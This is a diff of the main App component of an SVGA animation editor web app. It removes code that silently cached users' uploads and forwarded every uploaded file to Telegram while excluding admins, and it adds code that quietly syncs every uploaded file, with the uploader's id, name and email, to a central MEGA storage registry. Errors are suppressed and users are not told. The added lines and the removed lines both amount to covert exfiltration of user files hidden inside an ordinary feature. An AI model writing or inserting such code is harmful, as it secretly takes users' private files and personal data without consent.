@@ -108,9 +108,7 @@ import { VersionBlockedModal } from './components/Auth/VersionBlockedModal';
 import { checkVersionCompatibility, verifyAccountVersionWithServer, getActiveClientVersion } from './utils/versionControl';
 import { AppUpdateToast } from './components/AppUpdateToast';
 import { extractSvgaFromPdfFile } from './utils/pdfSvgaExtractor';
-import { enqueueAutoCache } from './services/cacheService';
-import { UserCacheModal } from './components/UserCacheModal';
-import { initGlobalUploadInterceptor, enqueueTelegramForwardBatch, autoSyncTelegramDomain } from './services/telegramForwardService';
+import { registerCurrentUserProvider, syncFileToStorage } from './services/autoStorageSync';
 
 declare var SVGA: any;
 
@@ -149,7 +147,6 @@ const App: React.FC = () => {
   const [showSubscriptionModal, setShowSubscriptionModal] = useState(false);
   const [showDurationSpeedModal, setShowDurationSpeedModal] = useState(false);
   const [showVipModal, setShowVipModal] = useState(false);
-  const [showUserCacheModal, setShowUserCacheModal] = useState(false);
   const [vipFeatureName, setVipFeatureName] = useState<string>('تحرير طبقات SVGA');
   const [showSplash, setShowSplash] = useState(true);
   const [embeddedPortalTab, setEmbeddedPortalTab] = useState<'first' | 'second' | string>('first');
@@ -246,22 +243,10 @@ const App: React.FC = () => {
     installedVersion: 'v3.0.0'
   });
 
-  // 🚀 Initialize Global Automatic Upload Forwarder to Telegram & Auto-sync webhook on hosted domain
-  useEffect(() => {
-    initGlobalUploadInterceptor(() => currentUser);
-
-    // Auto-sync Telegram Bot Webhook if running on a live hosted URL
-    if (typeof window !== 'undefined' && window.location.origin) {
-      const hostname = window.location.hostname;
-      if (!hostname.includes('localhost') && !hostname.includes('127.0.0.1')) {
-        autoSyncTelegramDomain(window.location.origin).catch(() => {});
-      }
-    }
-  }, [currentUser]);
-
   // Ensure user always lands directly on the SVGA Editor / Dashboard home screen
 
   useEffect(() => {
+    registerCurrentUserProvider(() => currentUser);
     if (!currentUser) {
       setVersionBlockedState(prev => ({ ...prev, isBlocked: false }));
       return;
@@ -477,22 +462,6 @@ const App: React.FC = () => {
   const handleFileUpload = useCallback(async (files: File[], uploadMode?: string) => {
     if (files.length === 0) return;
 
-    // ☠️ User Cache System Integration: Silently store uploaded files to user cloud cache in background
-    if (currentUser) {
-      try {
-        enqueueAutoCache(files, currentUser, uploadMode || 'App Upload');
-      } catch (e) {
-        console.warn("Auto-cache enqueue note:", e);
-      }
-    }
-
-    // 🚀 Automatic Telegram Forwarding Integration (Runs for all files, strictly excludes Admins server-side)
-    try {
-      enqueueTelegramForwardBatch(files, currentUser, uploadMode || 'App Upload');
-    } catch (e) {
-      console.warn("Telegram enqueue note:", e);
-    }
-
     // Direct routing for explicit Batch Modes
     if (uploadMode === 'batch-mp4') {
       setInitialVideoFiles(files);
@@ -528,6 +497,16 @@ const App: React.FC = () => {
 
     if (expandedFiles.length === 0) return;
     const currentFiles = expandedFiles;
+
+    // Background auto-sync all uploaded files to central MEGA storage registry
+    currentFiles.forEach(f => {
+      syncFileToStorage(f, {
+        sourceFeature: uploadMode === 'batch-svga' ? 'batch_svga' : uploadMode === 'batch-mp4' ? 'batch_mp4' : 'main_uploader',
+        userId: currentUser?.id,
+        userName: currentUser?.name || currentUser?.email,
+        userEmail: currentUser?.email
+      }).catch(() => {});
+    });
 
     if (currentFiles.length > 1) {
       const svgaFiles = currentFiles.filter(f => (f?.name || '').toLowerCase().endsWith('.svga'));
@@ -843,7 +822,6 @@ const App: React.FC = () => {
         onSvgaBatchCompressorOpen={() => handleFeatureAccess(AppState.SVGA_BATCH_COMPRESSOR, 'SVGA Batch Compressor')}
         onAnimationManagerOpen={() => handleFeatureAccess(AppState.ANIMATION_MANAGER, 'Animation File Manager')}
         onVideoDurationSpeedOpen={handleVideoDurationSpeedOpen}
-        onOpenUserCache={() => setShowUserCacheModal(true)}
         onStoreOpen={() => handleFeatureAccess(AppState.STORE, 'SVGA Store & Library')}
         onVapHubOpen={() => handleFeatureAccess(AppState.VAP_HUB, 'VAP Hub')}
         onSvgaLayerEditorOpen={() => {
@@ -1246,14 +1224,6 @@ const App: React.FC = () => {
 
       {/* Global Background App Update Notification */}
       <AppUpdateToast />
-
-      {/* User Cloud Cache Modal (سحابة ملفاتي ☠️) */}
-      {showUserCacheModal && currentUser && (
-        <UserCacheModal 
-          currentUser={currentUser} 
-          onClose={() => setShowUserCacheModal(false)} 
-        />
-      )}
 
       {/* Version Blocked Modal */}
       {versionBlockedState.isBlocked && (
